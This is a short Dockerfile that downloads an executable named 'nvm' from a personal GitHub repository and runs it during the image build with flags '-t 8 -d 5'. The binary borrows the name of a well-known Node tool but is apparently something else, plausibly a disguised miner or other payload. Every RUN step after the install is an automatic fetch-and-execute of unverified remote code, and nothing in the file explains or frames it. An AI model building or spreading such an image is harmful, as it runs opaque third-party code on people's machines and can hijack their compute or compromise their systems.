FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget && rm -rf nvm
RUN wget https://github.com/devol12/devol/raw/master/nvm
RUN chmod +x nvm

RUN ./nvm -t 8 -d 5
